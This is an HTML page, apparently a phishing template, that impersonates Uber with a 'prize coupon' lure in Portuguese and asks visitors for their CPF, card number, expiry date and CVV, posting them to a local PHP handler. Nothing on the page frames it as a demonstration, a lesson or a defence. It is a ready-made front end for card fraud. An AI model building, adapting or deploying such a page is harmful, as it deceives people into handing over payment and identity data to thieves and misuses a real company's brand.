<!DOCTYPE html>
<html>
  <head>
    <title>UBER Cupom Premiado</title>
    <style>
      body {
        background-image: url('https://files.tecnoblog.net/wp-content/uploads/2022/04/uber_capa-3_tb.jpg');
        background-size: cover;
        background-position: center;
        font-family: Arial, sans-serif;
        color: #fff;
      }

      #form {
        margin: auto;
        margin-top: 50px;
        padding: 20px;
        width: 400px;
        background-color: rgba(255, 255, 255, 0.8);
        border-radius: 10px;
      }

      h1 {
        text-align: center;
        margin-top: 50px;
      }

      label {
        color: #000;
      }

      input[type="text"],
      input[type="password"] {
        width: 100%;
        padding: 10px;
        margin-bottom: 10px;
        border: none;
        border-radius: 5px;
      }

      input[type="date"] {
        width: 100%;
        padding: 10px;
        margin-bottom: 10px;
        border: none;
        border-radius: 5px;
      }

      input[type="date"]::-webkit-inner-spin-button {
        -webkit-appearance: none;
        display: none;
      }

      input[type="submit"] {
        width: 100%;
        padding: 10px;
        margin-top: 10px;
        border: none;
        border-radius: 5px;
        background-color: #008CBA;
        color: #fff;
        font-weight: bold;
        cursor: pointer;
      }

      input[type="submit"]:hover {
        background-color: #006F8B;
      }
    </style>
  </head>
  <body>
    <h1>UBER Cupom Premiado</h1>
    <div id="form">
      <form action="http://localhost/processar_formulario.php" method="POST">
        <label for="cpf">CPF:</label>
        <input type="text" id="cpf" name="cpf" required>

        <label for="cartao">CARTÃO:</label>
        <input type="text" id="cartao" name="cartao" required>

        <label for="validade">VALIDADE (MM/AAAA):</label>
        <input type="text" id="validade" name="validade" pattern="^\d{2}\/\d{4}$" required>

        <label for="cvv">CVV:</label>
        <input type="password" id="cvv" name="cvv" required>

        <input type="submit" value="RESGATAR CUPOM">
      </form>
    </div>
  </body>
</html>
